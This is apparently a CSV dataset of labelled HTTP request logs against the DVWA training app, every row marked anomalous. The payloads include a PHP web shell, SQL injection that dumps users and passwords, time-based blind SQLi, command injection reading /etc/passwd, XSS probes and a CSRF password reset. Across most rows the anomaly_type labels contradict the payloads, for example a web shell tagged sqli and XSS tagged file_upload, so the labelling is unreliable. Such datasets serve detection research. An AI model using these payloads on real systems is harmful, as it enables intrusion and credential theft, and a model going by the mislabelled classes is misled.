request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
65,2025-12-01 10:40:00,GET,http://dvwa.local/vulnerabilities/upload/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=fbae5e5ff422d23fced3264dd4e6c6c4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
66,2025-12-01 10:50:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=44a543bddbfef21165fa63425bc2b212"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,file_upload,anomalous
67,2025-12-01 11:00:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ad1111fe421eabe6b6bdfcfff3dd4b52"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
68,2025-12-01 11:10:00,GET,http://dvwa.local/vulnerabilities/xss_d/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1dff42c2e35ffacd34141ecb3f6deebe"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
69,2025-12-01 11:20:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=623dcbebe21ff166ccdc5256fce12ef3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,file_upload,anomalous
70,2025-12-01 11:30:00,GET,http://dvwa.local/vulnerabilities/fi/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=14cacd414f11d16144fcf32c5ad5b5b4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
71,2025-12-01 11:40:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bbccaed1d3dd563b64665b5c3443f1de"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,file_upload,anomalous
72,2025-12-01 11:50:00,GET,http://dvwa.local/vulnerabilities/xss_r/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e335ff155b62354e64fdd1b5454a25a6"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
73,2025-12-01 12:00:00,GET,http://dvwa.local/vulnerabilities/fi/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6f655d55bea22a234fbbca21faeb53fc"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
74,2025-12-01 12:10:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ede4523a12bec362fc5bb3ef4c2c23d6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,sqli,anomalous
75,2025-12-01 12:20:00,GET,http://dvwa.local/vulnerabilities/exec/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3da56fbf21666b51e3464aadaa4121e3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
76,2025-12-01 12:30:00,GET,http://dvwa.local/vulnerabilities/sql_i/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dd1c41e253a335abff2d33b33b6143cb"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
77,2025-12-01 12:40:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4da31afef1edb13c1a5cfeb65153fde3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,command_injection,anomalous
78,2025-12-01 12:50:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b3ac1ae554dbfed43ce664314b6a123a"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,command_injection,anomalous
79,2025-12-01 13:00:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=53b1cfa63b6513e6bbb4a1f6cdd433dd"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,sqli,anomalous
80,2025-12-01 13:10:00,GET,http://dvwa.local/vulnerabilities/xss_d/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bbfe16cddbb343a5dbce13d6aef3cf4b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
81,2025-12-01 13:20:00,GET,http://dvwa.local/vulnerabilities/sqli/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ce36b26a6c24b54b6a6f3fefe5dfb222"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
82,2025-12-01 13:30:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=adbc5124464e1f51ecdc54a61466b2d4"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,sqli,anomalous
83,2025-12-01 13:40:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e55c2435a3611c65fdfbcc1a6cb365da"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,csrf,anomalous
84,2025-12-01 13:50:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6e6ebdbb6462c6364c2cd3b366e66a26"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,csrf,anomalous
85,2025-12-01 14:00:00,GET,http://dvwa.local/vulnerabilities/xss_d/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6b3c6c5b325fdcadbae365fe1bf523ba"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
86,2025-12-01 14:10:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dbe5ba66e653f22fad6e1612dbe1faab"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,csrf,anomalous
87,2025-12-01 14:20:00,GET,http://dvwa.local/vulnerabilities/fi/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=acda5def2b1c5efdfcda43be162154f1"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
88,2025-12-01 14:30:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=de5a1116b6f6cccaa3c4b2d34b11516a"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,csrf,anomalous
89,2025-12-01 14:40:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bb116bb44555d21fce23ee53afdee4d5"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,sqli,anomalous
90,2025-12-01 14:50:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6f4df2cc434541bd1b55ac45cf63d412"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,sqli,anomalous
91,2025-12-01 15:00:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ff6f1e5d4baa54cccc21563fbc4c2633"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,command_injection,anomalous
92,2025-12-01 15:10:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=fcd122a66512d3feddd262c1ca54edba"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,file_upload,anomalous
93,2025-12-01 15:20:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e3164e332f6edc21df3315652cc5f5e2"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,file_upload,anomalous
94,2025-12-01 15:30:00,GET,http://dvwa.local/vulnerabilities/xss_r/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=526a515eda5bce15fd34f2c2ad4c4f4b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
95,2025-12-01 15:40:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e6eacead4c32c3ebe2c4dd32e56e5ec6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,file_upload,anomalous
96,2025-12-01 15:50:00,GET,http://dvwa.local/vulnerabilities/sqli/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3b32ce2a5d1a622a3fe1fb32d22d2b4b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
97,2025-12-01 16:00:00,GET,http://dvwa.local/vulnerabilities/xss_r/?name=%3Cimg+src=x+onerror=alert(1)%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4f2446eeb153fcabb1f64a352f6da455"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
98,2025-12-01 16:10:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b4a52cef25b4ce6de5424b3a6be243ce"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
99,2025-12-01 16:20:00,GET,http://dvwa.local/vulnerabilities/upload/?id=1' OR '1'='1--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ff5fa2a5133c65132f3f22b452a61ffb"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
100,2025-12-01 16:30:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6ac2ecf4f5fbf2be1ab22d1c36eacf12"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,file_upload,anomalous
101,2025-12-01 16:40:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b2ae241eb5f43edcb5c4ce4a23b5f216"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
102,2025-12-01 16:50:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=5f16c13be251e654d66fbe33d35362c2"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,command_injection,anomalous
103,2025-12-01 17:00:00,GET,http://dvwa.local/vulnerabilities/csrf/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=62613dbef13f35d541ab3c4bdd53d4a4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
104,2025-12-01 17:10:00,GET,http://dvwa.local/vulnerabilities/upload/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=31c44d26e66d1ad245453241246dc3cc"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
105,2025-12-01 17:20:00,GET,http://dvwa.local/vulnerabilities/xss_r/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f1b2dd3bbda622f1e4dcca1e1bccdec4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
106,2025-12-01 17:30:00,GET,http://dvwa.local/vulnerabilities/fi/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bec26ca5e4bd3a1411fd2dab6412c2c3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
107,2025-12-01 17:40:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=263bfdba411cde2fa3122423a6b4db4f"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,file_upload,anomalous
108,2025-12-01 17:50:00,GET,http://dvwa.local/vulnerabilities/sqli/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1be416b3543e611ba216d35ee21bc5cc"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
109,2025-12-01 18:00:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2a3dc16e3cdacfd23b146cd432de3dff"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,command_injection,anomalous
110,2025-12-01 18:10:00,GET,http://dvwa.local/vulnerabilities/fi/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c255b1d5aaa1a1e25116f4ec43df1e12"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
111,2025-12-01 18:20:00,GET,http://dvwa.local/vulnerabilities/xss_s/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=fc6263fecfaeac5effa6d3145d1c2e25"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
112,2025-12-01 18:30:00,GET,http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1e5ff21bba2cce3bc43ffcb5aa1b2a1a"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
113,2025-12-01 18:40:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=21a32dbf65c4244c2d3ef2cebc51fbbf"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,csrf,anomalous
114,2025-12-01 18:50:00,GET,http://dvwa.local/vulnerabilities/upload/?id=1' OR '1'='1--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b251a63ff53f6f4e4551fd45b21da3a1"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
115,2025-12-01 19:00:00,GET,http://dvwa.local/vulnerabilities/sqli/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3deb2d5fed34e4fe1dde33523f3bcee1"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
116,2025-12-01 19:10:00,GET,http://dvwa.local/vulnerabilities/xss_s/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=44f2bde236e2d6a4cfa561c41323e26b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
117,2025-12-01 19:20:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=eca361311e4c6feac111eb1d14dfefce"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,file_upload,anomalous
118,2025-12-01 19:30:00,GET,http://dvwa.local/vulnerabilities/fi/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=fde4c34ee13dde3e1cdc1c36c3ccdc55"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
119,2025-12-01 19:40:00,GET,"http://dvwa.local/vulnerabilities/xss_s/?id=1'+UNION+SELECT+1,username,password+FROM+users--","{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=632241af2f655f65dc1a4f11e3c63f3a"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
120,2025-12-01 19:50:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=d2d1cf2efc3e5dcb1cbdcfeb6b4cf651"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
121,2025-12-01 20:00:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=11e3a4f2fee16dab56c12c4e3f35ed2b"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,xss,anomalous
122,2025-12-01 20:10:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=5abcddd2df5e26eca3263acba51ae4ad"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,xss,anomalous
